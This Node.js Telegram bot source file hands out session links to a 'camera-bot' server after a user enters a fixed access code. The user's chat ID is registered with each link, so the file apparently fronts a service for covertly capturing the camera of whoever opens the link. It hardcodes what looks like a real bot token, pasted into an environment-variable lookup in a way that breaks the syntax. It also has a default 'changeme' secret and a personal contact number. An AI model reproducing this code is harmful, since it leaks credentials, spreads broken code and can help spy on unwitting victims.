const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");
const crypto = require("crypto");

const BOT_TOKEN = process.env.7599562667:AAEzBnwqNr1uzn6F4ZmLSV0LIjobVrbnkJo;
const SERVER_URL = process.env.SERVER_URL || "https://camera-bot-k7e4.onrender.com";
const REGISTER_SECRET = process.env.REGISTER_SECRET || "changeme";
const ACCESS_CODE = "UEX25B";

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function genSession() {
  return crypto.randomBytes(3).toString("hex").toUpperCase();
}

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "🔐 Please enter the camera access code:");
});

// যখন user code পাঠাবে
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text?.trim();

  if (text && text !== "/start") {
    if (text === ACCESS_CODE) {
      const session = genSession();
      await fetch(`${SERVER_URL}/register-session`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          session,
          chat_id: chatId,
          secret: REGISTER_SECRET,
        }),
      });

      const link = `${SERVER_URL}/?session=${session}`;
      bot.sendMessage(chatId, `✅ Correct code!\n🔗 Here is your link:\n${link}`);
    } else {
      bot.sendMessage(
        chatId,
        `❌ কোডটি ভুল!\n\n🆘 সাহায্য দরকার? 👉 <a href="https://wa.me/8801752561935">Maruf vai 📲</a>\n\n✳️ Or: Please enter correct code.`,
        { parse_mode: "HTML", disable_web_page_preview: true }
      );
    }
  }
});
